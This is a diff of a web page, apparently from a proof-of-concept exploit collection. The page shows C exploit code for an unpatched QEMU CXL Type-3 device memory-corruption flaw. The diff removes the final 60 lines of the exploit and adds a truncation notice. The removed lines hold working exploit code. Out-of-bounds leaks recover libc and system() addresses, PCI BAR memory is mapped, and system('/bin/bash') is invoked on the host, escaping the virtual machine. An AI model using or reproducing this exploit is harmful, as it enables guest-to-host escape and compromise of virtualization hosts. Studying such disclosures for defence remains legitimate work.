@@ -570,66 +570,6 @@ Tools:       gcc, readelf, objdump, ldd, shell scripts in this folder
 </span><span class=lnt>497
 </span><span class=lnt>498
 </span><span class=lnt>499
-</span><span class=lnt>500
-</span><span class=lnt>501
-</span><span class=lnt>502
-</span><span class=lnt>503
-</span><span class=lnt>504
-</span><span class=lnt>505
-</span><span class=lnt>506
-</span><span class=lnt>507
-</span><span class=lnt>508
-</span><span class=lnt>509
-</span><span class=lnt>510
-</span><span class=lnt>511
-</span><span class=lnt>512
-</span><span class=lnt>513
-</span><span class=lnt>514
-</span><span class=lnt>515
-</span><span class=lnt>516
-</span><span class=lnt>517
-</span><span class=lnt>518
-</span><span class=lnt>519
-</span><span class=lnt>520
-</span><span class=lnt>521
-</span><span class=lnt>522
-</span><span class=lnt>523
-</span><span class=lnt>524
-</span><span class=lnt>525
-</span><span class=lnt>526
-</span><span class=lnt>527
-</span><span class=lnt>528
-</span><span class=lnt>529
-</span><span class=lnt>530
-</span><span class=lnt>531
-</span><span class=lnt>532
-</span><span class=lnt>533
-</span><span class=lnt>534
-</span><span class=lnt>535
-</span><span class=lnt>536
-</span><span class=lnt>537
-</span><span class=lnt>538
-</span><span class=lnt>539
-</span><span class=lnt>540
-</span><span class=lnt>541
-</span><span class=lnt>542
-</span><span class=lnt>543
-</span><span class=lnt>544
-</span><span class=lnt>545
-</span><span class=lnt>546
-</span><span class=lnt>547
-</span><span class=lnt>548
-</span><span class=lnt>549
-</span><span class=lnt>550
-</span><span class=lnt>551
-</span><span class=lnt>552
-</span><span class=lnt>553
-</span><span class=lnt>554
-</span><span class=lnt>555
-</span><span class=lnt>556
-</span><span class=lnt>557
-</span><span class=lnt>558
-</span><span class=lnt>559
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* DISCLAIMER: For authorized security research only. */</span>
 </span></span><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
 </span></span></span><span class=line><span class=cl><span class=cp></span>
@@ -1129,67 +1069,8 @@ Tools:       gcc, readelf, objdump, ldd, shell scripts in this folder
 </span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*] ok here we go</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>leak_more</span><span class=p>(</span><span class=k>volatile</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>ct3d_host</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                     <span class=kt>uint64_t</span> <span class=n>rank_host</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>memmove_plt</span><span class=p>,</span>
-</span></span><span class=line><span class=cl>                     <span class=kt>uint64_t</span> <span class=n>libc_start_main_got</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=o>*</span><span class=n>_system</span><span class=p>)</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>leak_slot</span> <span class=o>=</span> <span class=n>ct3d_host</span> <span class=o>+</span> <span class=mh>0x5400</span> <span class=o>+</span> <span class=mh>0x240000</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>leak_src</span> <span class=o>=</span> <span class=n>libc_start_main_got</span> <span class=o>-</span> <span class=p>(</span><span class=n>CXL_CACHELINE_SIZE</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint8_t</span> <span class=n>raw</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>libc_start_main</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>libcbase</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>fake_write_call</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=n>rank_host</span><span class=p>,</span> <span class=n>memmove_plt</span><span class=p>,</span> <span class=n>leak_slot</span><span class=p>,</span> <span class=n>leak_src</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>leak_oob_relative</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>,</span> <span class=n>raw</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>raw</span><span class=p>));</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>libc_start_main</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>uint64_t</span> <span class=o>*</span><span class=p>)</span><span class=n>raw</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] __libc_start_main: 0x%016&#34;</span> <span class=n>PRIx64</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>libc_start_main</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>libcbase</span> <span class=o>=</span> <span class=n>libc_start_main</span> <span class=o>-</span> <span class=mh>0x2A200</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>_system</span> <span class=o>=</span> <span class=n>libcbase</span> <span class=o>+</span> <span class=mh>0x058750</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] libcbase: 0x%016&#34;</span> <span class=n>PRIx64</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>libcbase</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] system: 0x%016&#34;</span> <span class=n>PRIx64</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=n>_system</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>volatile</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>mmio</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>ct3d_host</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>rank_host</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>memmove_plt</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>libc_start_main_got</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>_system</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>enable_pci_memory_decode</span><span class=p>(</span><span class=s>&#34;/sys/bus/pci/devices/0000:35:00.0&#34;</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/sys/bus/pci/devices/0000:35:00.0/resource2&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span> <span class=o>|</span> <span class=n>O_SYNC</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[-] failed to open. </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=n>mmio</span> <span class=o>=</span> <span class=nf>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=n>CXL_BAR2_MAP_SIZE</span><span class=p>,</span> <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span> <span class=n>MAP_SHARED</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>mmio</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>    <span class=p>}</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>leak_qemu</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>memmove_plt</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>libc_start_main_got</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>leak_oob_relative</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>ct3d_host</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=n>rank_host</span> <span class=o>=</span> <span class=n>ct3d_host</span> <span class=o>+</span> <span class=mh>0x6c5762</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=nf>leak_more</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=n>ct3d_host</span><span class=p>,</span> <span class=n>rank_host</span><span class=p>,</span> <span class=n>memmove_plt</span><span class=p>,</span> <span class=n>libc_start_main_got</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>_system</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[*] outside the Wall Maria...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>    <span class=nf>fake_write_call</span><span class=p>(</span><span class=n>mmio</span><span class=p>,</span> <span class=n>rank_host</span><span class=p>,</span> <span class=n>_system</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;/bin/bash&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></td></tr></table></div></div></div></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/network/2026-05-16_vmware-esxi-ad-auth-bypass/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in binary</span>
+</span></span></code></pre></td></tr></table></div></div></div><div class="flex items-center justify-between border-t border-zinc-700 bg-zinc-900 px-4 py-2"><span class="font-mono text-xs text-zinc-500">Showing 500 of 560 lines</span>
+<a href=/pocs/binary/2026-05-16_qemutiny-memory-corruption/poc.c target=_blank rel=noopener class="font-mono text-xs text-emerald-400 hover:underline">View full file →</a></div></div><nav class="mt-12 grid grid-cols-1 gap-3 border-t border-zinc-200 pt-6 sm:grid-cols-2 dark:border-zinc-800"><a href=/pocs/network/2026-05-16_vmware-esxi-ad-auth-bypass/ class="group rounded-lg border border-zinc-200 p-3 transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">← previous in binary</span>
 <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">VMware ESXi Active Directory Authentication Bypass (CVE-2024-37085)</span>
 </a><a href=/pocs/web/2026-05-16_pan-os-management-auth-bypass/ class="group rounded-lg border border-zinc-200 p-3 text-right transition hover:border-emerald-400 dark:border-zinc-800"><span class="font-mono text-[10px] uppercase tracking-wide text-zinc-400">next in binary →</span>
 <span class="mt-1 block truncate text-sm text-zinc-700 group-hover:text-emerald-600 dark:text-zinc-300 dark:group-hover:text-emerald-400">Palo Alto PAN-OS Management Interface Authentication Bypass (CVE-2025-0108)</span></a></nav></div><aside class="hidden lg:order-2 lg:block"><div class="sticky top-20"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40"><dl class="space-y-3 font-mono text-xs"><div><dt class="text-zinc-500 dark:text-zinc-400">Severity</dt><dd class=mt-1><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400"><span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical</span></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Category</dt><dd class=mt-1><a href=/pocs/binary/ class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">binary</a></dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">QEMU CXL Type-3 device emulation (hw/cxl/cxl-mailbox-utils.c)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">OOB read path: QEMU v7.1.0+ (introduced by 056172691b); OOB write path: QEMU v11.0.0+ (introduced by 5e5a86bab8 and da5cafdc4d)</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt><dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-16</dd></div><div><dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt><dd class=mt-1><span class="text-amber-600 dark:text-amber-400">unpatched</span></dd></div></dl><div><p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p><div class="mt-2 flex flex-wrap gap-1.5"><a href=/tags/qemu/ class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#QEMU</a>
